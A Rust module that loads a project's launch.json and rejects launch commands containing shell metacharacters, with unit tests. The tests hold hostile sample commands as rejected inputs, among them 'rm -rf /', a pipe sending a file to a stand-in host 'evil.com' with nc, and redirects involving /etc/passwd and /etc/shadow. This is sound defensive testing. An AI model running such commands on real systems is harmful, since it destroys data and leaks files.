use std::path::Path;

use serde::{Deserialize, Serialize};

const DIR: &str = ".rootcx";
const FILE: &str = "launch.json";
const TEMPLATE: &str = r#"{
  "preLaunch": ["verify_schema", "sync_manifest", "deploy_backend"],
  "command": "echo hello world"
}
"#;

#[derive(Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct LaunchConfig {
    #[serde(default)]
    pub pre_launch: Vec<String>,
    pub command: String,
}

pub fn read(project: &Path) -> Result<LaunchConfig, String> {
    let path = project.join(DIR).join(FILE);
    let data = std::fs::read_to_string(&path).map_err(|_| format!("{} not found", path.display()))?;
    let config: LaunchConfig = serde_json::from_str(&data).map_err(|e| format!("invalid launch.json: {e}"))?;
    validate_command(&config.command)?;
    Ok(config)
}

pub fn validate_command(cmd: &str) -> Result<(), String> {
    let forbidden = ['`', '$', '|', ';', '&', '>', '<', '(', ')', '{', '}', '\\', '\n', '\r'];
    if cmd.chars().any(|c| forbidden.contains(&c)) {
        return Err("launch command contains forbidden shell metacharacter".into());
    }
    Ok(())
}

pub fn init(project: &Path) -> Result<(), String> {
    let dir = project.join(DIR);
    std::fs::create_dir_all(&dir).map_err(|e| e.to_string())?;
    let path = dir.join(FILE);
    if !path.exists() {
        std::fs::write(&path, TEMPLATE).map_err(|e| e.to_string())?;
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn validate_rejects_shell_metacharacters() {
        for cmd in [
            "echo hello; rm -rf /",
            "cat file | nc evil.com 1234",
            "echo `whoami`",
            "echo $HOME",
            "cmd > /etc/passwd",
            "cmd < /etc/shadow",
            "cmd && evil",
            "$(whoami)",
            "a\nb",
            "cmd\\n",
            "eval(foo)",
            "{cmd}",
        ] {
            assert!(validate_command(cmd).is_err(), "should reject: {cmd}");
        }
    }

    #[test]
    fn validate_accepts_safe_commands() {
        for cmd in ["pnpm dev", "cargo tauri dev", "npm run dev", "echo hello world"] {
            assert!(validate_command(cmd).is_ok(), "should accept: {cmd}");
        }
    }

    #[test]
    fn read_rejects_malicious_launch_config() {
        let tmp = std::env::temp_dir().join("launch_test_malicious");
        let dir = tmp.join(DIR);
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(dir.join(FILE), r#"{"command":"echo hello; rm -rf /"}"#).unwrap();
        assert!(read(&tmp).is_err());
        std::fs::remove_dir_all(&tmp).ok();
    }

    #[test]
    fn deserialize_with_pre_launch() {
        let json = r#"{"preLaunch":["verify_schema","sync_manifest"],"command":"cargo tauri dev"}"#;
        let config: LaunchConfig = serde_json::from_str(json).unwrap();
        assert_eq!(config.pre_launch, vec!["verify_schema", "sync_manifest"]);
        assert_eq!(config.command, "cargo tauri dev");
    }

    #[test]
    fn deserialize_without_pre_launch() {
        let json = r#"{"command":"cargo tauri dev"}"#;
        let config: LaunchConfig = serde_json::from_str(json).unwrap();
        assert!(config.pre_launch.is_empty(), "should default to empty vec");
        assert_eq!(config.command, "cargo tauri dev");
    }
}
